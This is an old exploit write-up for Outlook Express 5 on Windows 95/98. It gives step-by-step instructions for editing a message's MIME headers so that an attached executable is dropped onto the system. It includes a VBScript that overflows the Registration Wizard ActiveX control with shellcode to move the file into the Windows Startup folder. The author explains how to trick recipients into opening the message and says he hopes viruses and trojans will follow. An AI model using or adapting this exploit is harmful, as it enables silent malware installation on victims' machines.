Author:Marklord Email: 1982@dnt.ro
Xploit name:Outlook Express allow to run attached files using scripts
Xploit accour:Microsoft Outlook Express 5 with Windows 95,98,maybe NT
Xploit description:Outlook Express allow to run attached files using the regobj script written
by Shane Hird,witchou a user know about it.Outlook Express create a temporary file when we
place on the background a sound or picture(This option is in:Outlook Express->New
Message->Format->Background->Picures or Sound).The temp file it is place on
C:\windows\temp\dat*.tmp(*=random numers and leters).It is better to put as a sound.Anyway we
can put in the place of the sound a program file exe,bat,com or other file and then we run it.Here
is how we do.
When you put a sound as background,for example ding.wav(from C:\windows\media)and then
save the mail,and then reopen the mail,Outlook create a id for sound so can be run from
attachament message.The source for the sound in the message is like this for example:
 
<BGSOUND 
src="cid:002801bf41c9$95325940$0100007f@computername">
 
computername=the name of the computer
 
In the part of attachament sound there is that id too like this:
 
Content-Type: audio/wav;
 name="ding.wav"
Content-Transfer-Encoding: base64
Content-ID: <002801bf41c9$95325940$0100007f@computername>
 
But we can take the id and change to a attachment file(exe or other).
For example we make a new message,we put as background a .wav(ding.wav,from
c:\windows\media\),then we attach a file.exe.
Then in the source of message we place Registration Wizard control script so we can rename the
temp file to a .exe.The script it will be like this:

<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00" id="RegWizObj"></object>
<script language="VbScript" >

expstr = "/i AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
expstr = expstr & Chr(235)
expstr = expstr & Chr(53)
expstr = expstr & Chr(208)
expstr = expstr & Chr(127)
expstr = expstr + Chr(144)
expstr = expstr + Chr(139) + Chr(252)
expstr = expstr + Chr(131) + Chr(199) + Chr(25)
expstr = expstr + Chr(80)
expstr = expstr + Chr(87)
expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + Chr(51) + Chr(192)
expstr = expstr + Chr(80)
expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + "move c:\windows\temp\d*.tmp c:\windows\startm~1\programs\startup\file.exe"

RegWizObj.InvokeRegWizard(expstr)

</script>
 
Then we save the message as msg.eml.And then we use a text editor like notepad or a better
text editor.In the editor open the msg.eml and then:
-on the part of attachement file.exe we cut:
 
Content-Disposition: attachment;
 filename="file.exe"
 
-and then paste it on the part of attachement ding.wav.It will show like this:
 
Content-Type: audio/wav;
 name="Ding.wav"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
 filename="file.exe"
 
-then at the part of attachement ding.wav we cut the content-id:
 
Content-ID: <002801bf41c9$95325940$0100007f@computername>
 
-we paste it at the part of attachement file.exe.It is going to apper like this:
 
Content-Type: application/x-msdownload;
 name="file.exe"
Content-Transfer-Encoding: base64
Content-ID: <002801bf41c9$95325940$0100007f@computername>
 
Then we save the msg.eml and we run it.You will see that on the attach it is appear file.exe(but
that is not the real file.exe is ding.wav).Remove the file.exe from there.You can save(or send it)
the msg.eml now.After you save it you can give preview.Outlook is close(becose of the
script),then we look and see the temp file has moved to windows directory as file.exe(we can use
any directory or file name).We can use startup directory from windows so can be run next time
windows start.
There are other ways you can change the id.But this is the simple one.
We can put as background 2 or how many .exe we want.But that is a little complicated.
If the Xploit work on windows NT we need to change the directory in the script where the
temp file is created(maybe c:\winnt\temp\d*.tmp)
You also can make a user to open a .eml that include this Xploit.For example attach a .eml
with this Xploit and send it to someone that has netscape messager.That someone it will
open the .eml and will be affected(only if has outlook express 5 installed).
I hope with this Xploit are going to appear viruses,trojans,and other,like
mellisa,zipped_files,and other.